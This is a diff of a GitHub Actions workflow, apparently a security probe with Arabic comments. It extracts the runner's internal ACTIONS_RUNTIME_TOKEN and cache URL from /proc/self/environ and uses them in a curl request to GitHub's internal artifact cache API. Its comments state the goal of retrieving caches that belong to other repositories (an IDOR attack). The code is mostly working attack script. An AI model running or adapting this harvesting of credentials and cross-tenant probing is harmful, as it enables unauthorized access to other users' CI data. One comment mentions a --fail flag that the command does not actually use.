@@ -1,27 +1,31 @@
-name: Cache API IDOR Test
+name: Cache API IDOR Test V2
 on: [push]
 jobs:
   test:
     runs-on: ubuntu-latest
     steps:
-      - name: Query Internal Cache API
+      - name: Query Internal Cache API via Memory Extract
         run: |
-          # 1. قراءة التوكن الداخلي الذي يربط الـ Runner بخوادم GitHub
-          TOKEN="$ACTIONS_RUNTIME_TOKEN"
-          URL="$ACTIONS_CACHE_URL"
+          # 1. استخراج المتغيرات من ذاكرة العملية (Process Environment)
+          ENV_DATA=$(cat /proc/self/environ | tr '\0' '\n')
           
-          echo "Cache URL: $URL"
-          echo "Token exists: $([ -n "$TOKEN" ] && echo yes || echo no)"
+          CACHE_URL=$(echo "$ENV_DATA" | grep ^ACTIONS_CACHE_URL= | cut -d'=' -f2-)
+          RUNTIME_TOKEN=$(echo "$ENV_DATA" | grep ^ACTIONS_RUNTIME_TOKEN= | cut -d'=' -f2-)
           
-          # 2. محاولة الاستعلام عن الكاش بدون تحديد Repository ID محدد
-          # لنعرف هل سترد GitHub بأي كاش لا يخصنا؟
-          # الـ API يستخدم مسار /_apis/artifactcache/caches
-          QUERY_URL="${URL}_apis/artifactcache/caches?keys=test"
+          echo "Cache URL found: $([ -n "$CACHE_URL" ] && echo yes || echo no)"
+          echo "Token found: $([ -n "$RUNTIME_TOKEN" ] && echo yes || echo no)"
           
-          echo "Sending IDOR request to: $QUERY_URL"
-          
-          # 3. إرسال الطلب
-          RESPONSE=$(curl -s -H "Authorization: Bearer $TOKEN" "$QUERY_URL")
-          
-          echo "API Response:"
-          echo "$RESPONSE"
+          # 2. إذا تم العثور على المتغيرات، قم بإرسال طلب IDOR
+          if [ -n "$CACHE_URL" ] && [ -n "$RUNTIME_TOKEN" ]; then
+            # مسار الـ API الخاص بالكاش
+            QUERY_URL="${CACHE_URL}_apis/artifactcache/caches"
+            
+            echo "Sending IDOR request to internal API..."
+            # نستخدم -s للصمت، و --fail لكي لا يتعطل الـ Workflow
+            RESPONSE=$(curl -s -H "Authorization: Bearer $RUNTIME_TOKEN" "$QUERY_URL")
+            
+            echo "API Response:"
+            echo "$RESPONSE"
+          else
+            echo "Failed to extract internal tokens."
+          fi
